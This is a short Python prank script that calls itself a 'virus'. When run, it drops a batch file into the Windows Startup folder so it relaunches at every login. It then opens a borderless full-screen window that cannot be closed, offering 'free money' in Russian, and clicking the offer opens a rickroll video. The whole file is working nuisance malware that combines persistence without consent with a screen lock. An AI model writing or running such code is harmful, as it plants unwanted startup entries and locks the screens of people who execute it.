import webbrowser
from tkinter import *
import os
import getpass
from ctypes import *

def starup():
	a = os.getcwd()
	file_play = r'%s\virushalava.py' % a
	pas = getpass.getuser()
	bat_path = r"C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" % pas
	with open(bat_path + '\\' + 'spumatey.bat', 'w+') as file:
		file.write(r'start "" %s' % file_play )
starup()

def close():
	pass
def rikroll():
	webbrowser.open('https://www.youtube.com/watch?v=xvFZjo5PgG0', new=2)
tk = Tk()
tk.config(bg = 'light green')
tk.wm_state('zoomed')
tk.overrideredirect(True)
tk.protocol('WM_DELETE_WINDOW', close)
tk.geometry('300x300')
b = Button(tk, text='халявные деньги', fg='black', bg='green', font=('Consolas', 50), command=rikroll)
b.place(x=300, y=300)
tk.mainloop() 
